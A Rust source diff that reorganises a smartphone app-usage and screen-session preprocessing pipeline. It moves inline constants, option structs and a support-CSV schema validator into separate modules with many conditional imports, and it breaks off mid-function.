@@ -1,22 +1,432 @@
 //! Chronicle preprocessing computations shared by the production query
 //! Salsa engine and an independent cold-run test oracle.
 
+use crate::payload_store::PayloadBytes;
 use ahash::{AHashMap, AHashSet};
 use blake3::Hasher as CheckpointHasher;
-use chrono::{DateTime, Datelike, Duration, NaiveDate, TimeZone, Timelike};
+use chrono::{DateTime, Datelike, Duration, NaiveDate, Offset, TimeZone, Timelike};
 use chrono_tz::Tz;
 use csv_core::{ReadFieldResult, Reader as CsvReader};
 use sha2::{Digest, Sha256};
 use smallvec::SmallVec;
+#[cfg(test)]
+use std::cell::Cell;
 use std::cell::RefCell;
 use std::collections::{BTreeMap, BTreeSet, HashMap};
-use std::io::Write as _;
 use std::sync::{Arc, OnceLock};
 use xxhash_rust::xxh3::{xxh3_128, Xxh3};
 
+use crate::b05_foundational_semantics::{self as b05, ScreenSessionConstructionStrategyId};
+use crate::b06_maximum_duration as b06;
 use crate::{parse_chronicle_timestamp_ns, weekday_chronicle, write_csv_field};
 
-use _rust_app_usage_matcher::{split_overlapping_sessions, UsageLayer};
+use _rust_app_usage_matcher::{split_overlapping_sessions, EpisodeCloseReason, UsageLayer};
+
+#[cfg(test)]
+use row_codec::{PersistedString, PersistedRowRef, intern_deserialized_str};
+#[cfg(test)]
+use checkpoint::{CheckpointSink};
+#[cfg(feature = "incremental-v2")]
+use checkpoint::{
+    WORKFLOW_ROW_SCHEMA, checkpoint_for_reordered_exact_rows, checkpoint_hasher,
+    finish_checkpoint_digest,
+    workflow_rows_checkpoint_with_parts_and_canonical_order,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use checkpoint::{
+    RowCheckpointScratch, WORKFLOW_CHECKPOINT_PROTOCOL, checkpoint_digest_fixed16,
+    row_checkpoint_parts, terminal_checkpoint_digest,
+    workflow_checkpoint_with_known_membership_and_order, workflow_checkpoint_with_reusable_rows,
+};
+#[cfg(feature = "incremental-v2")]
+use output::{
+    row_lineage_from_iter, screen_row_lineage_iter, write_app_csv_to,
+    write_screen_csv_with_b05_to,
+};
+#[cfg(feature = "incremental-v2")]
+use model::{SchoedelPreflightProduct};
+
+#[cfg(test)]
+use checkpoint::{
+    BufferedCheckpointHasher, CHECKPOINT_HASH_BUFFER_BYTES, FingerprintSink,
+    checkpoint_digest_positioned_fixed16_triple, checkpoint_digest_positioned_fixed16,
+    reusable_row_components_from_parts, reusable_row_components_from_rows,
+    workflow_checkpoint_with_group_parts, workflow_checkpoint_with_reusable_parts,
+};
+#[cfg(test)]
+use output::{
+    VISUALIZATION_DATA_B03_COLUMNS, VISUALIZATION_DATA_B03_PROTOCOL, VISUALIZATION_DATA_COLUMNS,
+    VISUALIZATION_DATA_PROTOCOL, append_csv_field, begin_csv_field, build_app_columns,
+    collapse_zero_mantissa, decimal_to_exponential, ecma_to_precision, emit_csv_i32,
+    emit_event_timestamp, emit_screen_timestamp, emit_session_timestamp, round_to_precision,
+    strip_exp_leading_zeros, to_exponential, write_event_timestamp_fmt, write_screen_csv,
+    write_screen_timestamp_fmt, write_session_timestamp_fmt, ecma_to_fixed,
+};
+#[cfg(feature = "incremental-v2")]
+use checkpoint::workflow_output_checkpoint;
+
+pub use model::{RawRow, Row, RowData, MatcherInput, MatcherOutput};
+use model::RowInner;
+#[path = "pipeline/stage_functions.rs"]
+mod stage_functions;
+#[cfg(test)]
+use source::{canonicalize_source_rows, decode_source_records};
+#[cfg(test)]
+use reconstruction::{classify_episode_durations, match_app_episodes_with_strategy};
+#[cfg(test)]
+use screen::classify_screen_sessions;
+pub use stage_functions::StageFunctions;
+
+#[path = "pipeline/payload.rs"]
+mod payload;
+pub(crate) use payload::{row_table_footprint, RowTableFootprint};
+#[path = "pipeline/execution.rs"]
+mod execution;
+
+#[path = "pipeline/options.rs"]
+mod options;
+pub use options::{FilterMatchField, IntervalExpansionMethod, InteractionTypeRemovalMode, LockedScreenAudioDisposition, ScreenSessionClassificationPolicy, ScreenSessionMaximumDurationDisposition};
+use support::AppFilterRules;
+pub(crate) use screen::{apply_screen_session_policies, bound_app_rows_to_interactive_screen, screen_duration_excluded_participants, remove_participants};
+pub use scientific::reconstruction_base_is_reusable;
+use polled::materialize_behapp_half_open_seconds;
+pub use options::{
+    DayBoundaryAttribution, EpisodeReconstructionStrategy, EventRetentionSet,
+    IntervalQualityPolicy, MaximumDurationValidation, MicroUseClassification,
+    MicroUseClassificationPolicy, MinimumDurationComparator, MinimumDurationDisposition,
+    NotificationProxyRule, OpenerSet, OpenerSetApplicability, OpenerSetRefusalReason,
+    OptionVocabulary, AGGREGATE_SHAPES,
+    OpenerStrategyRelation, PackageExclusionPreset, PipelineV2Options, PipelineV2OptionsJson,
+    PipelineV2OptionsValidationError, PipelineV2SupportFiles, PolledEmulationMethod,
+    PresenceTrackedOption, ScreenGatingRule, SessionBoundaryScope, SessionGapBasis,
+    SessionGapThreshold, SessionGroupingPolicy, SessionGroupingRules, UsageSessionMode,
+    maximum_duration_row_stage, opener_set_applicability, resolve_maximum_duration,
+    validate_pipeline_v2_options, validate_pipeline_v2_options_with,
+};
+use options::{
+    checked_minimum_duration_threshold_ns, default_true, minimum_duration_threshold_ns,
+    seconds_to_ns_floor,
+};
+
+#[path = "pipeline/model.rs"]
+mod model;
+pub use model::{
+    B05ComputationPhase, B05InputBoundary, B05OptionsDigestOrigin, B05PreflightError,
+    B05PreflightIdentity, B05PreflightIdentityField, B05PreparedExecutionError,
+    B05SchoedelPreflightResult, B05SchoedelPreparedInput, B05SchoedelValidationReceipt,
+    B05SchoedelValidationStatus, B05ScreenPreparedSubstrate,
+    B05_RETAINED_RAW_INPUT_REQUIRED_ERROR, B05_SCHOEDEL_PREFLIGHT_PROTOCOL_VERSION,
+    B05_SCHOEDEL_VALIDATION_RECEIPT_PROTOCOL_VERSION, CodebookEntry,
+    ConcurrentSubintervalFloorReceipt, EYES_INPUT_PARTITION_PREFLIGHT_PROTOCOL_VERSION,
+    EYES_RETAINED_RAW_INPUT_REQUIRED_ERROR, EYES_TAGGED_FAU_VALIDATION_RECEIPT_PROTOCOL_VERSION,
+    EyesInputPartitionOptionsDigestOrigin, EyesInputPartitionPreflightError,
+    EyesInputPartitionPreflightIdentity, EyesInputPartitionPreflightResult,
+    EyesInputPartitionRefusalReason, EyesTaggedFauValidationReceipt,
+    EyesTaggedFauValidationStatus, FoundationalSemanticsEvidence, LineageSearchDigest,
+    LineageSearchEvidence, MicroUseReceipt, MinimumDurationExcludedEpisode,
+    MinimumDurationReceipt, OpenerSetEvidence, PREPROCESSOR_VERSION, ParticipantInputBoundary,
+    PipelineRowLineage, PipelineV2Result, RETAINED_RAW_INPUT_REQUIRED_FOR_DECODE_ERROR,
+    ScientificPreflightDisposition, ScreenIntervalLineage, SourceDataRowRange,
+    TIMEZONE_HANDLING_MODES, WorkflowCheckpoint, ZeroDurationCleanupEvidence,
+    ZeroDurationCleanupReceipt, ZeroDurationRemovedRow,
+};
+use model::{
+    ACTIVITY_PAUSED, ACTIVITY_RESUMED, ACTIVITY_STOPPED, AMAZON_APPS, ANDROID_PSEUDO_PACKAGE,
+    APP_USAGE, AttributedRows, AttributionCompleteness, AttributionCompletenessDay,
+    AttributionMinutes, AttributionReport, B05RouterOptionsIdentity,
+    B05SchoedelValidationContext, B05ScreenOptionsIdentity, CODEBOOK_RENAME_PAIRS,
+    COLLAPSED_GENRE_FIELD_INDICES, CULVERHOUSE_BAD_APP_CAP_FLAG, CULVERHOUSE_BAD_APP_CAP_NS,
+    CULVERHOUSE_COLLAPSED_FLAG, CULVERHOUSE_DST_DAY_FLAG, CULVERHOUSE_LONG_3H_FLAG,
+    CULVERHOUSE_LONG_3H_NS, CULVERHOUSE_LONG_6H_FLAG, CULVERHOUSE_LONG_6H_NS,
+    CULVERHOUSE_PARTIAL_DAY_FLAG, CULVERHOUSE_PARTIAL_DAY_GAP_HOURS,
+    CULVERHOUSE_SAME_APP_COLLAPSE_NS, ComplianceDayCheckpoint, ComplianceResultCheckpoint,
+    CoverageDayCheckpoint, CoverageOutput, CreditDecision, CreditEmission, CreditEmissionCounts,
+    CreditInterval, CreditPartition, CreditPartitionCheckpoint, CreditReportOwned, CreditResult,
+    DRAXLER_INACTIVITY_NS, DayApps, DayCoverageCheckpoint, END_OF_USAGE_MISSING,
+    EyesInputPartitionOptionsIdentity, EyesTaggedFauValidationContext,
+    FILTERED_APP_BACKGROUND_USAGE, FILTERED_APP_USAGE, FILTERED_PAUSED, FILTERED_RESUMED,
+    FILTERED_STOPPED, FOREGROUND_EVENTS, FOUNDATIONAL_SEMANTICS_CHECKPOINT,
+    FoundationalEpisodeEvidence, GESIS_EVENT_THRESHOLD, GESIS_MAX_TIMEOUT_NS,
+    GESIS_START_EVENTS, GESIS_STOP_EVENTS, GESIS_UNMATCHABLE_STOP_EVENTS, InlineLineageDigest,
+    KIDS_SHELL_PACKAGES, LOCK_SCREEN_EVENTS, MEANINGFUL_ACTIVITY_EVENTS,
+    MORRISON_LOCK_TIMEOUT_NS, MergedMatcherOutput, NO_ACTIVITY_PLACEHOLDER_PACKAGE,
+    NON_TARGET_CHILD_APP_USAGE, NOTIFICATION_INTERRUPTION, NOTIFICATION_OUTSIDE_USAGE_FLAG,
+    NOTIFICATION_PROXY_FLAG_PREFIX, NOTIFICATION_SEEN, NOTIFICATION_WITHIN_USAGE_FLAG,
+    NotificationContactCounts, NotificationContactOutput, OKOSHI_MICRO_USE_THRESHOLD_NS, ObservedUsageSpanGroup, ObservedUsageSpans,
+    POLLED_EMULATION_FLAG_PREFIX, POLLED_EMULATION_FORCED_TERMINAL_FLAG,
+    POLLED_EMULATION_NOT_OBSERVED_FLAG, PolledEmulationOutput, PolledRun,
+    PolledSample, ResolvedParticipantWindow, RowCountReport,
+    SCREEN_START_EVENTS, SCREEN_STOP_EVENTS, SCREEN_USAGE, SchoedelOptionsIdentity,
+    SchoedelValidationWitness, ScreenChangePoint, ScreenCreditOutput, ScreenCreditState,
+    ScreenCreditSubstrate, SharedString, SharingEntry, SharingResolution,
+    SharingResolutionValue, SharingStatus, SourceDataRows, StudyWindow, StudyWindowExclusion, SurveyLookup,
+    TimezoneSelection, UNLOCK_EVENTS, WindowedRows, ZERO_DURATION_CLEANUP_CHECKPOINT,
+};
+
+#[path = "pipeline/row_codec.rs"]
+mod row_codec;
+pub(crate) use row_codec::{
+    compact_deserialized_row_payload, decode_row_lineage_payload, encode_row_lineage_payload,
+    with_deserialized_row_string_pool, with_serialized_row_string_table,
+};
+use row_codec::{
+    SharedStringPool, deserialize_codebook_fields, deserialize_lineage_searches,
+    deserialize_screen_lineage, deserialize_shared_arc_string, empty_codebook_fields,
+    empty_codebook_fields_ref, empty_lineage_searches, serialize_codebook_fields,
+    serialize_lineage_searches, serialize_shared_arc_string, shared_lineage_text,
+};
+
+#[path = "pipeline/checkpoint.rs"]
+mod checkpoint;
+pub use checkpoint::{validate_workflow_checkpoint_for_subject};
+pub(crate) use checkpoint::{value_fingerprint};
+use checkpoint::{
+    RowCheckpointParts, checkpoint_digest_field, checkpoint_for_exact_row_state,
+    checkpoint_for_exact_state, neutral_b05_screen_construction_checkpoint,
+    record_workflow_checkpoint, row_checkpoint_parts_for_rows, row_parts_sequence_digest,
+    row_reference_sequence_digest, session_grouping_checkpoint_payload,
+    timezone_retained_source_rows_digest, timezone_stage_digest, workflow_checkpoint,
+    workflow_checkpoint_with_parts,
+    workflow_rows_checkpoint, workflow_rows_checkpoint_reusing_last, workflow_state_checkpoint,
+};
+
+#[path = "pipeline/output.rs"]
+mod output;
+pub use output::{
+    codebook_column_renames, declared_app_output_columns, declared_screen_output_columns,
+    declared_screen_output_columns_for_strategy, insert_conditional_app_output_columns,
+    normalize_float_string,
+};
+use output::{
+    CountingSink, LocalDateMemo, build_review_summary, build_row_lineage,
+    build_row_lineage_from_iter, build_screen_row_lineage, build_visualization_data,
+    codebook_col_index, csv_escape_value, ecma_round_fixed_f64,
+    fmt_session_timestamp, format_cadence_seconds, format_threshold,
+    foundational_output_projection, headline_eligible_app_rows, js_number_to_string,
+    participant_event_timestamps, ts_to_local, write_app_csv, write_app_csv_from_iter,
+    write_selected_screen_csv,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use output::{compliance_csv};
+
+#[cfg(test)]
+use support::{
+    normalize_support_date, parse_csv_to_records, parse_survey_timestamp_ns,
+};
+#[cfg(test)]
+use scientific::{
+    b05_router_options_digest, b05_schoedel_validation_digest, schoedel_options_digest,
+};
+#[cfg(test)]
+use screen::{ScreenState};
+#[cfg(test)]
+use reconstruction::{
+    empty_inline_lineage_search_suffix_digest, eyes_close_reason,
+    inline_lineage_search_range_digest, match_app_episodes, materialize_candidate_episodes,
+};
+#[cfg(test)]
+use source::{derive_time_gap_evidence};
+#[cfg(test)]
+use annotations::{suppress_excluded_timing};
+
+#[path = "pipeline/stages/source.rs"]
+mod source;
+pub use source::{
+    canonical_raw_participant_ids, canonical_raw_participant_keys, discover_timezones_v2_native, split_raw_by_study,
+};
+use source::{
+    count_duplicate_groups, normalize_interaction_type_local, populate_time_columns,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use source::{
+    attach_device_models, bind_processing_timestamp, coalesce_duplicate_event_keys, collect_timezone_observations, disambiguate_duplicate_timestamps, estimate_dominant_timezone, mark_gaps,
+    remove_missing_timestamps, resolve_timezone_strategy, rows_are_event_ordered,
+    rows_have_strictly_increasing_timestamps, standardize_event_clock, summarize_row_selection,
+    validate_remap_rules,
+};
+#[cfg(test)]
+use source::{
+    raw_study_ids_to_split, unalign_duplicate_timestamps, order_source_records,
+};
+
+#[path = "pipeline/stages/support.rs"]
+mod support;
+pub use support::{
+    validate_supplied_communication_relationships,
+    validate_filter_file_for_preset, validate_support_csv,
+};
+use support::{
+    parse_apps_forcing_csv, parse_background_apps_csv, parse_codebook_csv,
+    parse_csv_to_records_with_physical_rows, parse_device_sharing, parse_enrolled_devices,
+    parse_filter_csv, parse_study_windows, parse_survey_lookup,
+};
+
+#[path = "pipeline/stages/reconstruction.rs"]
+mod reconstruction;
+use reconstruction::{
+    BoundSchoedelReconstruction, apply_event_retention, bound_schoedel_reconstruction,
+    decode_matcher_payload, empty_lineage_search_suffix_digest, encode_blake3_digest,
+    encode_matcher_payload, label_filtered_apps, lineage_search_range_digest,
+    materialize_schoedel_candidate_rows, schoedel_opener_evidence,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use reconstruction::{
+    apply_app_inclusion_policy, apply_maximum_duration_to_row, build_app_event_index,
+    mark_app_policy_matches, mask_excluded_app_events,
+    materialize_candidate_episodes_in_place,
+    materialize_candidate_episodes_with_suffix, order_app_episodes, resolve_excluded_packages,
+    segment_concurrent_usage, timing_blanked_packages,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use reconstruction::{
+    inline_lineage_search_suffix_digests, retained_schoedel_events,
+};
+
+#[path = "pipeline/stages/annotations.rs"]
+mod annotations;
+use annotations::{
+    add_app_usage_detail_columns, assign_usage_session_ids, collapse_app_genre,
+    derive_broad_category, is_zero_duration_cleanup_candidate, join_codebook, mark_app_usage_flags,
+    push_row_flag, split_sessions_at_local_midnight,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use annotations::{
+    apply_episode_flags, collapse_app_genre_step, derive_broad_category_step,
+    derive_engagement_basis, interval_quality_step, remove_selected_interaction_types,
+    remove_zero_duration_rows,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use annotations::{
+    apply_codebook_annotations, apply_review_annotations_one_pass,
+    apply_static_review_annotations_fused, mark_app_usage_flags_row, prepare_usage_flags,
+};
+#[cfg(test)]
+use annotations::{
+    clear_filtered_usage_timing, collapse_app_genre_row, local_day_start_ns,
+};
+
+#[path = "pipeline/stages/screen.rs"]
+mod screen;
+pub use screen::{is_screen_session_start};
+use screen::{
+    chronicle_interval_inputs, chronicle_orphan_stop_issues, derive_screen_usage_sessions_full,
+    finalize_chronicle_b05_screen, materialize_b05_screen_rows,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use screen::{
+    index_keyguard_events,
+    infer_screen_session_skeletons,
+};
+pub use screen::{ScreenSessionClose, ScreenClassificationSettings};
+
+#[cfg(test)]
+use credit::{reference_alive_intervals};
+
+#[path = "pipeline/stages/credit.rs"]
+mod credit;
+#[cfg(any(test, feature = "incremental-v2"))]
+use credit::{
+    assemble_credit_outputs, build_activity_witness_indexes, derive_credited_intervals,
+    identify_credit_eligible_sessions, materialize_credited_rows, screen_incapable_participants,
+    summarize_daily_apps,
+};
+#[cfg(test)]
+use credit::{
+    build_alive_spans, build_screen_credit_substrate, clip_alive_spans,
+    credit_lineage_contributors, creditable_intervals, intersect_intervals, is_credit_session,
+    screen_source_event_suffix_digest, screen_witness_state,
+};
+
+#[path = "pipeline/stages/notification.rs"]
+mod notification;
+#[cfg(any(test, feature = "incremental-v2"))]
+use notification::{
+    classify_notification_contacts, index_observed_usage_spans, select_notification_events,
+};
+
+#[path = "pipeline/stages/polled.rs"]
+mod polled;
+#[cfg(any(test, feature = "incremental-v2"))]
+use polled::{
+    group_polled_runs, materialize_polled_rows, sample_polled_timeline,
+};
+
+#[path = "pipeline/stages/attribution.rs"]
+mod attribution;
+pub use attribution::matching_study_participant_id;
+#[cfg(test)]
+use attribution::sharing_status_for;
+use attribution::{
+    add_no_activity_placeholder_rows, apply_study_window, attribute_person, build_compliance_csv,
+    build_day_coverage_csv, index_raw_dates, resolve_participant_windows,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use attribution::{
+    accumulate_minutes, apply_compliance_threshold, build_coverage,
+    compute_attribution_completeness, resolve_sharing, resolve_windows,
+    synthesize_placeholder_rows,
+};
+#[cfg(test)]
+use attribution::{
+    numerical_id, window_for,
+};
+
+#[path = "pipeline/scientific.rs"]
+mod scientific;
+pub use scientific::{
+    b05_schoedel_is_active, bind_b05_screen_substrate, eyes_complement_is_active, eyes_effective_options,
+    minimum_duration_excluded_lineage_bytes, preflight_b05_schoedel,
+    preflight_b05_schoedel_with_input_boundary, preflight_eyes_complement_input_partition,
+    prepare_b05_schoedel, prepare_b05_schoedel_with_input_boundary, prepare_b05_screen_substrate,
+    prepare_b05_screen_substrate_with_input_boundary, rebind_b05_schoedel_prepared,
+    validate_b05_schoedel_validation_receipt_integrity,
+    validate_eyes_tagged_fau_validation_receipt_integrity,
+    validate_foundational_semantics_evidence_for_options,
+    validate_minimum_duration_excluded_lineage, validate_prepared_b05_schoedel,
+    validate_prepared_b05_schoedel_with_input_boundary, validate_zero_duration_cleanup_evidence,
+    validate_zero_duration_cleanup_lineage, validated_b05_schoedel_receipt,
+    validated_eyes_tagged_fau_receipt, zero_duration_removed_lineage_bytes,
+};
+pub(crate) use scientific::{
+    bind_finalized_b05_preflight, inactive_b05_preflight, validate_verified_request_options_digest,
+};
+#[cfg(test)]
+use scientific::sha256_jcs;
+#[cfg(test)]
+use scientific::requires_b05_screen_validation;
+use scientific::{
+    PreflightRows, attach_concurrent_subinterval_floor_evidence,
+    attach_zero_duration_cleanup_evidence, b05_evidence_assignment_digest,
+    b05_identity_from_support, b05_schoedel_refusal_error,
+    b05_screen_options_digest,
+    eyes_input_partition_identity_from_support,
+    eyes_input_partition_refusal_error, foundational_semantics_evidence,
+    maximum_duration_evidence_for_rows, parse_schoedel_capability_evidence,
+    participant_input_boundary_from_support, preflight_eyes_input_partition_with_raw_digest,
+    raw_b05_events, schoedel_is_active,
+    sha256_wire, validate_prepared_b05_schoedel_with_raw_digest,
+};
+#[cfg(any(test, feature = "incremental-v2"))]
+use scientific::{
+    canonicalize_foundational_episode_evidence, foundational_episode_evidence_from_rows,
+    foundational_semantics_evidence_for_episode_evidence,
+    foundational_semantics_evidence_for_policies, maximum_duration_evidence_for_episode_evidence,
+    validate_micro_use_receipt_shape,
+    validate_minimum_duration_receipt_shape, zero_duration_cleanup_evidence,
+};
+
+#[path = "pipeline/sequential.rs"]
+mod sequential;
+pub use sequential::{
+    run_pipeline_v2_with_supports_and_dependencies, prepare_sequential_run_with_dependencies,
+    prepare_sequential_run_with_verified_input_and_dependencies,
+    sequential_scientific_preflight_with_stages,
+    sequential_scientific_preflight_with_verified_input_and_stages, VerifiedRawInput,
+    PreparedSequentialRun, prepare_sequential_run, run_pipeline_v2,
+    run_pipeline_v2_with_background, run_pipeline_v2_with_prepared_b05,
+    run_pipeline_v2_with_supports, run_prepared_sequential, sequential_scientific_preflight,
+};
+use sequential::{QueryCheckpointRecorder};
 
 #[path = "pipeline_v2_aggregates.rs"]
 pub mod aggregates;
@@ -26,7870 +436,14 @@ mod incremental;
 pub use incremental::{
     reconstruction_base_header_bytes, review_base_header_bytes, select_persisted_review_base,
     IncrementalPipelineV2Engine, IncrementalPipelineV2Execution, PersistedReviewBaseSelection,
+    RawCsvBytes,
 };
 
-pub const PREPROCESSOR_VERSION: &str = "1.0.0";
-
-/// Closed product contract for timezone handling. Tests enumerate every
-/// ordered transition so a fifth policy cannot be added without explicit
-/// invalidation and output checks.
-pub const TIMEZONE_HANDLING_MODES: [&str; 4] = [
-    "selected-filter",
-    "selected-convert",
-    "primary-filter",
-    "primary-convert",
-];
-
-// ---- canonical interaction-type constants -------------------------------
-
-const ACTIVITY_RESUMED: &str = "Activity Resumed";
-const ACTIVITY_PAUSED: &str = "Activity Paused";
-const ACTIVITY_STOPPED: &str = "Activity Stopped";
-const FILTERED_RESUMED: &str = "Filtered App Resumed";
-const FILTERED_PAUSED: &str = "Filtered App Paused";
-const FILTERED_STOPPED: &str = "Filtered App Stopped";
-const APP_USAGE: &str = "App Usage";
-const FILTERED_APP_USAGE: &str = "Filtered App Usage";
-const FILTERED_APP_BACKGROUND_USAGE: &str = "Filtered App Background Usage";
-const NON_TARGET_CHILD_APP_USAGE: &str = "Non-Target Child App Usage";
-const END_OF_USAGE_MISSING: &str = "End of Usage Missing";
-const SCREEN_USAGE: &str = "Screen Usage";
-
-const KIDS_SHELL_PACKAGES: &[&str] = &[
-    "com.amazon.tahoe",
-    "com.sencatech.iwawa.iwawahome",
-    "com.google.android.apps.kids.home",
-    "com.kiddoware.kidsplace",
-    "com.tcl.kidsmode",
-];
-
-// ---- screen-state constants ---------------------------------------------
-
-const SCREEN_START_EVENTS: &[&str] = &["Screen Interactive", "Screen Interactive/Keyguard Shown"];
-const SCREEN_STOP_EVENTS: &[&str] = &[
-    "Screen Non-Interactive",
-    "Device Screen Off",
-    "Screen Non-Interactive/Keyguard Hidden",
-];
-const LOCK_SCREEN_EVENTS: &[&str] = &["Keyguard Shown", "Screen Interactive/Keyguard Shown"];
-const UNLOCK_EVENTS: &[&str] = &[
-    "Keyguard Hidden",
-    "User Unlocked",
-    "Screen Non-Interactive/Keyguard Hidden",
-];
-const FOREGROUND_EVENTS: &[&str] = &["Activity Resumed", "Filtered App Resumed"];
-const MEANINGFUL_ACTIVITY_EVENTS: &[&str] = &[
-    "Activity Resumed",
-    "Filtered App Resumed",
-    "User Interaction",
-    "Shortcut Invocation",
-    "Chooser Action",
-    "App Component Used",
-    "User Unlocked",
-    "Keyguard Hidden",
-];
-
-const AMAZON_APPS: &[&str] = &[
-    "com.amazon.redstone",
-    "com.amazon.firelauncher",
-    "com.amazon.imp",
-    "com.amazon.alta.h2clientservice",
-    "com.amazon.media.session.monitor",
-];
-
-// Codebook column rename map. Matches CODEBOOK_COLUMN_RENAME_MAP in TS.
-// Order MUST match TS Object.values order — JS preserves insertion order.
-const CODEBOOK_RENAME_PAIRS: &[(&str, &str)] = &[
-    ("application_label", "codebook_application_label"),
-    ("bcm_play_store_genreId", "bcm_play_store_genreId"),
-    ("bcm_play_store_genre", "bcm_play_store_genre"),
-    (
-        "bcm_play_store_broad_app_category",
-        "bcm_play_store_broad_app_category",
-    ),
-    ("bcm_play_store_developer", "bcm_play_store_developer"),
-    ("bcm_play_store_free", "bcm_play_store_free"),
-    ("bcm_play_store_rating", "bcm_play_store_rating"),
-    ("bcm_play_store_downloads", "bcm_play_store_downloads"),
-    ("usc_broad_app_category", "usc_broad_app_category"),
-    ("usc_genreId", "usc_genreId"),
-    (
-        "umich_child_app_category_code",
-        "umich_child_app_category_code",
-    ),
-    ("umich_child_app_category", "umich_child_app_category"),
-    (
-        "umich_adult_app_category_code",
-        "umich_adult_app_category_code",
-    ),
-    ("umich_adult_app_category", "umich_adult_app_category"),
-    ("umich_free", "umich_free"),
-    ("umich_gambling_app", "umich_gambling_app"),
-    ("umich_inappropriate_app", "umich_inappropriate_app"),
-    ("babyemu_genreId_scraped", "babyemu_genreId_scraped"),
-    ("babyemu_genreId_manual", "babyemu_genreId_manual"),
-    ("babyemu_broad_app_category", "babyemu_broad_app_category"),
-    ("babyemu_medium_app_category", "babyemu_medium_app_category"),
-    ("babyemu_fine_app_category", "babyemu_fine_app_category"),
-    (
-        "babyemu_alternate_fine_app_category",
-        "babyemu_alternate_fine_app_category",
-    ),
-    ("babyemu_kids", "babyemu_kids"),
-    ("bcm_cnrc_heuristic_category", "bcm_cnrc_heuristic_category"),
-    (
-        "bcm_cnrc_categorization_source",
-        "bcm_cnrc_categorization_source",
-    ),
-    ("dataset", "codebook_dataset"),
-];
-
-const COLLAPSED_GENRE_FIELD_INDICES: [usize; 4] = [1, 9, 17, 18];
-
-fn codebook_output_columns() -> Vec<&'static str> {
-    CODEBOOK_RENAME_PAIRS.iter().map(|(_, v)| *v).collect()
-}
-
-/// The codebook join's own supplied-column to output-column table. The
-/// field-level workflow contract binds `app_codebook_file` columns and the codebook
-/// output columns through this table instead of restating either list.
-pub fn codebook_column_renames() -> &'static [(&'static str, &'static str)] {
-    CODEBOOK_RENAME_PAIRS
-}
-
-// Stable column index lookup for codebook fields, matching the order above.
-fn codebook_col_index(name: &str) -> Option<usize> {
-    CODEBOOK_RENAME_PAIRS.iter().position(|(_, v)| *v == name)
-}
-
-// ---- options ------------------------------------------------------------
-
-#[derive(Debug, Clone)]
-pub struct PipelineV2Options {
-    pub study_name: String,
-    pub timezone: String,
-    pub timezone_handling: String,
-    pub usage_session_mode: UsageSessionMode,
-    pub include_app_output: bool,
-    pub include_screen_output: bool,
-    pub use_filter_file: bool,
-    pub use_apps_forcing_screen_open: bool,
-    pub use_background_apps_file: bool,
-    pub use_app_codebook: bool,
-    pub include_category_column: bool,
-    pub deduplicate_exact_rows: bool,
-    pub interaction_type_remap: Vec<String>,
-    pub correct_duplicate_event_timestamps: bool,
-    pub allow_stop_event_reuse: bool,
-    pub use_activity_stopped_as_fallback: bool,
-    pub apply_threshold_to_fallback: bool,
-    pub long_duration_threshold_ns: i64,
-    pub proximity_interval_ns: i64,
-    pub custom_app_engagement_duration: f64,
-    pub long_data_time_gap_thresholds: Vec<f64>,
-    pub long_usage_duration_thresholds: Vec<f64>,
-    pub same_app_stop_types: Vec<String>,
-    pub other_stop_types: Vec<String>,
-    pub interaction_types_to_remove: Vec<String>,
-    pub screen_auto_lock_timeout_seconds: f64,
-    pub screen_auto_lock_tolerance_seconds: f64,
-    pub screen_manual_lock_max_tail_seconds: f64,
-    pub screen_keyguard_near_stop_seconds: f64,
-    pub datetime_of_preprocessing: String,
-    pub model_concurrent_usage: bool,
-    pub minimum_usage_duration: f64,
-    pub apply_minimum_usage_duration_to_concurrent_subintervals: bool,
-    pub filter_zero_duration_sessions: bool,
-    pub add_no_activity_placeholder_days: bool,
-    pub enable_study_window_filter: bool,
-    pub enable_person_attribution: bool,
-    pub enable_day_coverage: bool,
-    pub enable_compliance_scoring: bool,
-    pub compliance_threshold_percent: f64,
-    pub enable_screen_gated_crediting: bool,
-    pub enable_aggregates: bool,
-    pub aggregate_shape: String,
-    /// Effective browser view target for the final output query only. The raw
-    /// UI flags remain in the receipt; their OR is the only value that can
-    /// affect Rust output materialization.
-    pub materialize_visualization_data: bool,
-    pub credited_session_cap_minutes: f64,
-    pub device_liveness_gap_tolerance_minutes: f64,
-    pub auto_lock_bridge_seconds: f64,
-    pub no_witness_min_day_apps: u32,
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-pub enum UsageSessionMode {
-    NoUsage,
-    AppUsage,
-    ScreenUsage,
-    AppAndScreenUsage,
-}
-
-// ---- support file loaders ----------------------------------------------
-
-/// Validate a support file against the exact schema used by the Rust
-/// pipeline before it can satisfy a role. This closes the former gap where a
-/// correctly named CSV with unrelated columns qualified and then behaved like
-/// an empty lookup.
-pub fn validate_support_csv(role: &str, bytes: &[u8]) -> Result<(), String> {
-    let mut reader = csv::ReaderBuilder::new()
-        .has_headers(true)
-        .flexible(true)
-        .from_reader(bytes);
-    let headers = reader
-        .headers()
-        .map_err(|error| format!("{role}: unreadable CSV header: {error}"))?
-        .iter()
-        .map(|header| header.trim().trim_start_matches('\u{feff}').to_string())
-        .collect::<BTreeSet<_>>();
-    let row_count = reader.records().try_fold(0usize, |count, record| {
-        record
-            .map(|record| count + usize::from(record.iter().any(|cell| !cell.trim().is_empty())))
-            .map_err(|error| format!("{role}: malformed CSV record: {error}"))
-    })?;
-    let require = |names: &[&str]| -> Result<(), String> {
-        let missing = names
-            .iter()
-            .filter(|name| !headers.contains(**name))
-            .copied()
-            .collect::<Vec<_>>();
-        if missing.is_empty() {
-            Ok(())
-        } else {
-            // PHI safety: never echo the found headers — a headerless upload
-            // would leak its first data row here.
-            Err(format!(
-                "{role}: missing required column(s) {}",
-                missing.join(", ")
-            ))
-        }
-    };
-    let require_one = |names: &[&str]| -> Result<(), String> {
-        if names.iter().any(|name| headers.contains(*name)) {
-            Ok(())
-        } else {
-            Err(format!(
-                "{role}: requires one of columns {}",
-                names.join(", ")
-            ))
-        }
-    };
-    match role {
-        "filter_file" => require_one(&["app_package_name", "package_name"]),
